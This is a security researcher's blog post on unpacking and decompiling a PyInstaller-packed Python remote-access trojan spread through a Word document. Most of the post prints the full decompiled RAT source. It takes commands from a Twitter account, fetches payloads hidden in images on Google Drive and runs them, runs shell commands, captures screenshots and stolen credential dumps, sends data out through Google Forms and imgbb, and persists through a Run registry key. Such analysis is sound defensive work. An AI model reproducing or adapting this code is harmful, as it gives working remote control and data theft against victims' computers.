---
layout: post
title:  "A new foe has appeared !"
date:   09-02-2020 13:34:34
categories: malware
---
![](/images/new-foe/new-foe.jpg){: width="600" height="600")}

Introduction
============
The idea to finally set up my own blog stems from my first malware analysis where a word document was spotted on Twitter by one of my colleague. Following the Twitter thread shows that some researchers had already did some preliminary analysis but the main payload still needed to be unpacked and analized. After reaching out to one of the researcher (@Arkbird_SOLG) I was directed to a great tutorial about how to unpack python executable ([Tutorial][link1])

Sample
=======
<blockquote class="twitter-tweet"><p lang="en" dir="ltr">interesting sample<br>maybe <a href="https://twitter.com/hashtag/APT?src=hash&amp;ref_src=twsrc%5Etfw">#APT</a><br>Hash:7c487d8462567a826da95c799591f5fb<br><br>Cc <a href="https://twitter.com/Arkbird_SOLG?ref_src=twsrc%5Etfw">@Arkbird_SOLG</a> <a href="https://twitter.com/ItsReallyNick?ref_src=twsrc%5Etfw">@ItsReallyNick</a> <a href="https://twitter.com/spider_girl22?ref_src=twsrc%5Etfw">@spider_girl22</a> <a href="https://twitter.com/DeadlyLynn?ref_src=twsrc%5Etfw">@DeadlyLynn</a> <a href="https://twitter.com/cyb3rops?ref_src=twsrc%5Etfw">@cyb3rops</a> <a href="https://t.co/migPtNcAJI">pic.twitter.com/migPtNcAJI</a></p>&mdash; @Rmy (@Rmy_Reserve) <a href="https://twitter.com/Rmy_Reserve/status/1217066627440635905?ref_src=twsrc%5Etfw">January 14, 2020</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>

As mentionned before, researchers had already figure out that the document was first downloading a dropper by reaching out to an googledrive link, downloading a picture from which the python RAT was extracted. 

![](/images/new-foe/new-foe/Mickey.jpg){: width="600" height="600")}

As a result, I headed to [AnyRun][link2] in order to fetch the RAT that I now needed to unpack. After running strings on the executable for good mesure, I cloned the [python-exe-unpacker][link3] and unpacked the file:
{% highlight bash%}
root@ubuntu:/opt/python-exe-unpacker$ sudo python python_exe_unpack.py -i prc.bin
[*] On Python 3.6
[*] Processing prc.bin
[*] Pyinstaller version: 2.1+
[*] This exe is packed using pyinstaller
[*] Unpacking the binary now
[*] Python version: 37
[*] Length of package: 6760411 bytes
[*] Found 39 files in CArchive
[*] Beginning extraction...please standby
[!] Warning: The script is running in a different python version than the one used to build the executable
    Run this script in Python37 to prevent extraction errors(if any) during unmarshalling
[*] Found 324 files in PYZ archive
[*] Successfully extracted pyinstaller exe.
{% endhighlight %}

Now that we have the compiled python script (.pyc) and the python libraries (.pyd) from the executable file, we need to uncompile our main executable which in this case is final2.

After failing to use sudo and getting some errors with uncompyle6:
{% highlight bash%}
root@ubuntu:/opt/python-exe-unpacker/unpacked/prc.bin$ uncompyle6
Traceback (most recent call last):
(...)
TypeError: not all arguments converted during string formatting
{% endhighlight %}

We realize that we need to change our file extension:

{% highlight bash%}
root@ubuntu:/opt/python-exe-unpacker/unpacked/prc.bin$ sudo uncompyle6 final2
# file final2
# path final2 must point to a .py or .pyc file
{% endhighlight %}

We are now greeted with yet another error:
{% highlight bash%}
root@ubuntu:/opt/python-exe-unpacker/unpacked/prc.bin$ sudo uncompyle6 final2.pyc
Traceback (most recent call last):
  File "/root/.local/lib/python3.6/site-packages/xdis/load.py", line 106, in load_module
    version = float(magics.versions[magic][:3])
KeyError: b'\xe3\x00\x00\x00'
(...)
TypeError: ord() expected string of length 1, but int found
{% endhighlight %}

This is due to the fact that the first 16-bytes of data on the header is missing. To find the missing bytes, we just need to open one of the other .pyc files available:

![](/images/new-foe/original.png){: width="600" height="600")}![](/images/new-foe/base64.png){: width="600" height="600")}

Now after struggling a bit, I found that instead of adding the value:
42 0D 0D 0A 00 00 00 00 00 00 00 00
to mimic the structure of the existing pyc files, I needed to actually add:
42 0D 0D 0A 00 00 00 00 00 00 00 00 00 00 00 00
And that the file was only getting decompiled on my windows environment...

Finaly we can uncompyle the file:
{% highlight bash%}
C:\Users\root\Desktop>uncompyle6 final2.pyc
# uncompyle6 version 3.6.2
# Python bytecode 3.7 (3394)
# Decompiled from: Python 3.7.4 (tags/v3.7.4:e09359112e, Jul  8 2019, 19:29:22) [MSC v.1916 32 bit (Intel)]
# Embedded file name: final2.py
from requests import post, get
from datetime import datetime
from os import path, environ, remove, startfile
from bs4 import BeautifulSoup
from time import sleep, gmtime, strftime
import subprocess, threading, winreg as wreg
from base64 import b64decode, b64encode
from random import choice
import sys
tw = '@jhone87438316'
ss_id = '1FAIpQLSfCNzwaz4WoFfnvNZS99CeGMp86H3hNoHCtwira8uW_b3vYTQ'
ss_id_entry = 'entry.62933741'
out_id = '1FAIpQLSfwDQBvgZZfMu1LKviMuCdaWfYato07ac5tS5IZJS1XZ6BEbw'
out_user_entry = 'entry.1539892742'
out_result_entry = 'entry.1818065606'
fk = '1BmzeSxclQMmxiD-8SjnyxXQolx-44cJh'
t1 = '1JRWUcux5uocl9gNZ3f8Ue--P1kLjZkQC'
t2 = '1Z2Y_QZXvza28ZqLUuzmWiSElvcySBf2o'
ch = [
 'chrome', 'ccleaner', 'winrar', 'proc']
chimg = ['imag', 'pic', 'photo', 'cartoon']
u1 = choice(ch) + '.exe'
img = choice(chimg) + '.jpg'
txt = choice(ch) + '.txt'

def xvfdgytrynmsdfdszxc(command):
    DEVNULL = subprocess.DEVNULL
    out = str(subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL).decode()).replace('\r\r\n', '')
    return out


content1 = xvfdgytrynmsdfdszxc('wmic diskdrive get SerialNumber /format:list').replace(' ', '').replace('SerialNumber=', '')

def dvnhhqertbvvfkl(file, id):
    if not path.exists(file):
        print('log no exist *')
        with open(file, 'w+') as f:
            f.write(id)
            f.flush()
            f.close()
        xvfdgytrynmsdfdszxc('attrib +h "%appdata%\\temp3.tmp"')
    else:
        print('log  exist *')
        remove(file)
        with open(file, 'w+') as f:
            f.write(id)
            f.flush()
            f.close()
        xvfdgytrynmsdfdszxc('attrib +h "%appdata%\\temp3.tmp"')


def dghtytyplqwesbnz(jpg_file_path, out_file):
    f = open(jpg_file_path, 'rb')
    jpgdata = f.read()
    f.close()
    b64 = str(jpgdata).split('****')[1].replace("'", '')
    bytes = b64decode(b64, validate=True)
    f = open(out_file, 'wb')
    f.write(bytes)
    f.close()
    return out_file


def qtypasadfzxc(id):
    p1 = environ['appdata'] + '\\' + choice(chimg) + '.jpg'
    url = 'https://drive.google.com/uc?export=qtypasadfzxcload&id=' + id
    headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',  'Upgrade-Insecure-Requests':'1',  'DNT':'1',  'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',  'Accept-Language':'en-US,en;q=0.5',  'Accept-Encoding':'gzip, deflate'}
    r = get(url, headers=headers)
    with open(p1, 'wb') as f:
        f.write(r.content)
        f.close()
    out = environ['appdata'] + '\\' + u1
    d1 = dghtytyplqwesbnz(p1, out)
    delcmd = 'del ' + p1
    xvfdgytrynmsdfdszxc(delcmd)


def dzdfdytyuio(userid, fileid):
    p1 = environ['USERPROFILE'] + '\\qtypasadfzxcloads\\' + choice(chimg) + '.jpg'
    p2 = environ['USERPROFILE'] + '\\qtypasadfzxcloads\\' + choice(ch) + '.exe'
    url = 'https://drive.google.com/uc?export=qtypasadfzxcload&id=' + fileid
    headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',  'Upgrade-Insecure-Requests':'1',  'DNT':'1',  'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',  'Accept-Language':'en-US,en;q=0.5',  'Accept-Encoding':'gzip, deflate'}
    r = get(url, headers=headers)
    with open(p1, 'wb') as f:
        f.write(r.content)
        f.flush()
        f.close()
    dvnhhqertbvvfkl(environ['appdata'] + '\\temp3.tmp', fileid)
    d1 = dghtytyplqwesbnz(p1, p2)
    remove(p1)
    startfile(p2)
    gfdggvbdsopqq(out_id, out_user_entry, userid, out_result_entry, d1)


def fdvdgfyfytuiowe():
    contents = ''
    mylist = []
    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, 'Keyboard Layout\\Preload', 0, wreg.KEY_ALL_ACCESS)
    try:
        for i in range(4):
            n, v, t = wreg.EnumValue(key, i)
            mylist.append(v[4:])

    except EnvironmentError:
        pass

    key.Close()
    if not any(x == '0401' for x in mylist):
        if not (any(x == '0801' for x in mylist) or any(x == '0c01' for x in mylist) or any(x == '1001' for x in mylist) or any(x == '1401' for x in mylist) or any(x == '1801' for x in mylist) or any(x == '1c01' for x in mylist) or any(x == '2001' for x in mylist) or any(x == '2401' for x in mylist) or any(x == '2801' for x in mylist) or any(x == '3801' for x in mylist) or any(x == '3401' for x in mylist) or any(x == '3c01' for x in mylist)):
            if any(x == '3001' for x in mylist):
                pass
        else:
            os._exit(0)
    elif not path.exists(environ['appdata'] + '\\temp1.tmp'):
        serial = xvfdgytrynmsdfdszxc('wmic diskdrive get SerialNumber /format:list').replace(' ', '').replace('SerialNumber=', '')
        if serial == '':
            os._exit(0)
        ver = xvfdgytrynmsdfdszxc('wmic  os get Caption /Format:List & wmic computersystem get Manufacturer,Model,domain , Name /Format:List & WMIC /Node:localhost /Namespace:\\\\root\\SecurityCenter2 Path AntiVirusProduct Get displayName /Format:List').replace('Caption=', '').replace('Model', '').replace('Domain', '').replace('Name', '').replace(' ', '=').replace('Manufacturer', '').replace('\n\n\n', '').replace('displayName', '').split('=')
        v = ''
        for i in ver:
            v += i[:4]

        sss = serial + v
        with open(environ['appdata'] + '\\temp1.tmp', 'w+') as f:
            f.write(sss)
            f.flush()
            f.close()
        xvfdgytrynmsdfdszxc('attrib +h "%appdata%\\temp1.tmp"')
        with open(environ['appdata'] + '\\temp1.tmp', 'r') as f:
            contents = f.read()
            f.close()
    else:
        with open(environ['appdata'] + '\\temp1.tmp', 'r') as f:
            contents = f.read()
            f.close()
    return contents


def bgfhfghggrydss(id='dfffdfdgrrhh'):
    now = datetime.now()
    dvnhhqertbvvfkl(environ['appdata'] + '\\temp3.tmp', id)
    qtypasadfzxc(t1)
    sleep(2)
    cmd = 'start %appdata%\\' + u1 + ' savescreenshot %appdata%\\' + img
    print(cmd)
    xvfdgytrynmsdfdszxc(cmd)
    with open(environ['appdata'] + '\\' + img, 'rb') as file:
        url = 'https://api.imgbb.com/1/upload'
        payload = {'key':ddrtrtrtrtetecvcdfdfdee(fk),
         'image':b64encode(file.read()),
         'name':content1[:7] + now.strftime('%H:%M')}
        res = post(url, payload)
    delcmd = 'del %appdata%\\' + u1 + '& del %appdata%\\' + img
    xvfdgytrynmsdfdszxc(delcmd)


def tyyinccdfdfdsygg(id='werrttyyggg'):
    dvnhhqertbvvfkl(environ['appdata'] + '\\temp3.tmp', id)
    qtypasadfzxc(t2)
    cmd = 'start %appdata%\\' + u1 + '  /stext %appdata%\\' + txt
    print(cmd)
    xvfdgytrynmsdfdszxc(cmd)
    sleep(2)
    dd = ''
    with open(environ['appdata'] + '\\' + txt, 'r') as file:
        dd = file.read()
        file.close()
    serial = fdvdgfyfytuiowe()[:10]
    gfdggvbdsopqq(out_id, out_user_entry, serial, out_result_entry, dd.replace('\x00', ''))
    delcmd = 'del %appdata%\\' + u1 + '& del %appdata%\\' + txt
    xvfdgytrynmsdfdszxc(delcmd)


def mjhd(name=tw):
    if name.startswith('@'):
        name = name[1:]
    url = 'https://twitter.com/' + name
    headers = {'User-Agent': 'Chrome/28.0.1500.52'}
    r = get(url, headers=headers)
    data = r.text
    print(r.status_code)
    soup = BeautifulSoup(data, 'html.parser')
    title = soup.title.text
    bio = soup.find('p', {'class': 'ProfileHeaderCard-bio'}).text
    tweets = soup.findAll('div', {'class': 'tweet'})
    m1 = tweets[:1][0].find('p').text
    print(m1)
    return m1


def fdsrttrt():
    user_agent = {'Referer':'https://api.ipify.org',
     'User-Agent':'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.52 Safari/537.36'}
    ip = get('https://api.ipify.org', headers=user_agent).text
    return ip


def rthgfhfgdtr(url='http://www.google.com/', timeout=5):
    try:
        req = get(url, timeout=timeout)
        req.raise_for_status()
        return True
    except requests.HTTPError as e:
        try:
            return False
        finally:
            e = None
            del e

    except requests.ConnectionError:
        return False

    return False


def fgdgdghnccvbbqw(id, entry, string):
    url = 'https://docs.google.com/forms/d/e/' + id + '/formResponse'
    enc = b64encode(bytes(string, 'utf8')).decode()
    form_data = {entry: enc}
    user_agent = {'Referer':'https://docs.google.com/forms/d/e/' + id + '/viewform',  'User-Agent':'Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/28.0.1500.52 Safari/537.36'}
    r = post(url, data=form_data, headers=user_agent)
    if r.status_code == 200:
        return True
    return False


def gfdggvbdsopqq(id, entry1, string1, entry2, string2):
    url = 'https://docs.google.com/forms/d/e/' + id + '/formResponse'
    enc1 = b64encode(bytes(string1, 'utf8')).decode()
    enc2 = b64encode(bytes(string2, 'utf8')).decode()
    form_data = {entry1: enc1, entry2: enc2}
    user_agent = {'Referer':'https://docs.google.com/forms/d/e/' + id + '/viewform',  'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36'}
    r = post(url, data=form_data, headers=user_agent)
    if r.status_code == 200:
        return True
    return False


def ddrtrtrtrtetecvcdfdfdee(id):
    url = 'https://drive.google.com/uc?export=qtypasadfzxcload&id=' + id
    headers = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36',  'Upgrade-Insecure-Requests':'1',  'DNT':'1',  'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',  'Accept-Language':'en-US,en;q=0.5',  'Accept-Encoding':'gzip, deflate'}
    r = get(url, headers=headers)
    return b64decode(r.content).decode()


def ffgrtrdffdfcvcdfdfdef():
    pt = sys.argv[0]
    destination = environ['USERPROFILE'] + '\\Documents\\' + sys.argv[0].split('\\')[(-1)]
    try:
        key0 = wreg.OpenKey(wreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, wreg.KEY_ALL_ACCESS)
        tt = wreg.QueryValueEx(key0, 'ChromeUpdater')
        key0.Close()
        if tt[0].replace('\\\\', '\\') != destination:
            key1 = wreg.OpenKey(wreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, wreg.KEY_ALL_ACCESS)
            wreg.SetValueEx(key1, 'ChromeUpdater', 0, wreg.REG_SZ, destination)
            key1.Close()
    except FileNotFoundError:
        key2 = wreg.OpenKey(wreg.HKEY_CURRENT_USER, 'Software\\Microsoft\\Windows\\CurrentVersion\\Run', 0, wreg.KEY_ALL_ACCESS)
        wreg.SetValueEx(key2, 'ChromeUpdater', 0, wreg.REG_SZ, destination)
        key2.Close()


def dfdfppoqwwdfdef(txt):
    temp = tempfile.TemporaryFile()
    temp.write(bytes(txt, 'utf8'))
    temp.seek(0)
    return temp.read().decode()


def dfhbbnnnffsse(id):
    contents = ''
    if not path.exists(environ['appdata'] + '\\temp3.tmp'):
        print('log not exist')
        contents = ''
    else:
        f = open(environ['appdata'] + '\\temp3.tmp', 'r')
        contents = f.read()
        f.close()
    if id != contents or contents == '':
        return True
    return False


def dfdereerexccb(tweet):
    if '--' in tweet:
        if len(tweet.split('--')) >= 2:
            ssid = tweet.split('--')[0]
            id = tweet.split('--')[1]
            cmd = tweet.split('--')[2]
            if ssid in fdvdgfyfytuiowe() or ssid == 'all':
                pass
            elif dfhbbnnnffsse(id):
                if cmd == 'dd':
                    dzdfdytyuio(ssid, id)
                if cmd == 'cc':
                    bgfhfghggrydss(id)
                if cmd == 'pp':
                    tyyinccdfdfdsygg(id)
                if cmd == 'md':
                    content2 = ddrtrtrtrtetecvcdfdfdee(id)
                    dd = xvfdgytrynmsdfdszxc(content2)
                    dvnhhqertbvvfkl(environ['appdata'] + '\\temp3.tmp', id)
                    gfdggvbdsopqq(out_id, out_user_entry, ssid, out_result_entry, dd)


def dfdftretretnmnddeeaax():
    while True:
        try:
            while rthgfhfgdtr():
                sleep(10)
                if not path.exists(environ['appdata'] + '\\temp2.tmp'):
                    f = open(environ['appdata'] + '\\temp2.tmp', 'w+')
                    xvfdgytrynmsdfdszxc('attrib +h "%appdata%\\temp2.tmp"')
                    i = fdvdgfyfytuiowe() + fdsrttrt().replace('.', 'p')
                    sleep(1)
                    status = fgdgdghnccvbbqw(ss_id, ss_id_entry, i)
                    sleep(1)
                    f.write(str(status))
                    f.close()
                tweet = mjhd()
                dfdereerexccb(tweet)

        except:
            pass
        else:
            print('')


def main():
    t1 = threading.Thread(target=fdvdgfyfytuiowe)
    t1.start()
    t = threading.Thread(target=ffgrtrdffdfcvcdfdfdef)
    t.start()
    t2 = threading.Thread(target=dfdftretretnmnddeeaax)
    t2.start()
    t1.join()
    t.join()
    t2.join()


if __name__ == '__main__':
    main()
# okay decompiling final2.pyc
{% endhighlight %}

{% highlight bash%}
{% endhighlight %}

Ressources:
===========
https://zondatw.github.io/2019/pyinstaller_decompile/
https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/FlareOn6_Challenge7_Solution_WOPR.pdf
https://infosecuritygeek.com/reversing-a-simple-python-ransomware/

[link1]:https://infosecuritygeek.com/reversing-a-simple-python-ransomware/  
[link2]:https://app.any.run/tasks/1d7567d9-0eac-4944-ba38-4894fdfe1c2f/
[link3]:https://github.com/countercept/python-exe-unpacker
